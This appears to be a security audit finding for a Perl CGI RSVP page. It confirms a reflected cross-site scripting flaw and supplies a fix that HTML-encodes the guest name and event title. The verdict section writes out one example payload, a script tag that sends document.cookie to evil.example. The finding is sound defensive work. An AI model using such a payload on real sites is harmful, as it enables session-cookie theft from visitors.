## Verdict

Confirmed. `$guest_name` and `$event_title` come from `CGI->param()` (untrusted request input) and are interpolated directly into an HTML response with no encoding, so a value such as `guest_name=<script>document.location='//evil.example/?'+document.cookie</script>` is emitted verbatim into the page and executes in the victim's browser.

## Source

- `$guest_name = $cgi->param('guest_name')` — line 10
- `$event_title = $cgi->param('event_title')` — line 11

Both are attacker-controlled query/form parameters read via `CGI`'s `param()` accessor.

## Fix

```perl
#!/usr/bin/perl
use strict;
use warnings;
use CGI;

# RSVP confirmation page for a company event signup form.
sub rsvp_confirmation {
    my $cgi = CGI->new;

    my $guest_name  = $cgi->param('guest_name');
    my $event_title = $cgi->param('event_title');

    print $cgi->header(-type => 'text/html', -charset => 'utf-8');
    print "<!DOCTYPE html>\n";
    print "<html><head><title>RSVP Confirmed</title></head><body>\n";

    print "<h2>Thanks, ", $cgi->escapeHTML($guest_name),
          "! You're confirmed for ", $cgi->escapeHTML($event_title), ".</h2>\n";

    print "<p>A calendar invite has been emailed to you.</p>\n";
    print "</body></html>\n";
    return;
}

rsvp_confirmation();

1;
```

## Explanation

The sink at line 18 builds an HTML fragment by string interpolation, so any HTML metacharacters in `$guest_name` or `$event_title` (`<`, `>`, `"`, `'`, `&`) pass straight into the response and are parsed as markup rather than text. The fix HTML-encodes both values at the point of output using `CGI`'s built-in `escapeHTML` method (which escapes `&`, `<`, `>`, `"`, and `'`), turning any injected markup into inert text. Encoding is applied at render time rather than at the point the parameters are read, since the same values could legitimately be used elsewhere (e.g. logging, a database insert) where HTML-escaping would be the wrong transformation. `CGI::escapeHTML` is available on every `CGI.pm` object with no additional dependency, and since it is called once per value at the print site it also naturally covers any future additional output of these same variables as long as each new print site repeats the call.
